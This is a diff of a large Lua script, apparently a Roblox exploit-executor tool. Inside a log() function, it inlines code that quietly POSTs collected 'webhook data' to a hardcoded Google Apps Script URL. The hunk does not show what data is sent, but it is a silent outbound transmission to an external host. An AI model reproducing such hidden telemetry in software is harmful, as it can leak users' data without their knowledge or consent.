@@ -22280,20 +22280,22 @@ function log()
 				return noxious["http service"]:JSONEncode(data)
 			end
 
-			local function sendWebhook(webhookUrl, data)
-				local headers = {
-					["content-type"] = "application/json"
-				}
-
-				local request = http_request or request or HttpPost or syn.request
-				local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
-				request(abcdef)
-			end
-
 			local webhookUrl = "https://script.google.com/macros/s/AKfycbwQfvo_kXhNMNCrvulsEsF3dcwQ70VBm6apqnzIIR_HU3q81bmRDvjMrac0lJyCgSX3wA/exec"
 			local webhookData = createWebhookData()
 
-			sendWebhook(webhookUrl, webhookData)
+			local headers = {
+				["content-type"] = "application/json"
+			}
+
+			local request = http_request or request or HttpPost or syn.request
+			local relayPayload = {
+				Url = webhookUrl,
+				Body = webhookData,
+				Method = "POST",
+				Headers = headers
+			}
+
+			request(relayPayload)
 		end
 	end
 end
